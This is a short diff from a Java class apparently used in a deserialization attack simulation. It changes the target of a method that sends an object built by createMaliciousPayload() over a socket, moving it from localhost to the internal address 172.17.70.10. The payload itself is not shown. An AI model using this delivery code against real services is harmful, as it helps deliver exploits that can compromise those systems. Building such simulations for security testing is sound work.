@@ -98,7 +98,7 @@ public class Simulation2GeneratePayload
 
     public static void sendMaliciousPayload() throws IOException
     {
-        Socket clientSocket = new Socket("127.0.0.1", 8915);
+        Socket clientSocket = new Socket("172.17.70.10", 8915);
         ObjectOutputStream outToServer = new ObjectOutputStream(clientSocket.getOutputStream());
         outToServer.writeObject(createMaliciousPayload());
         outToServer.flush();
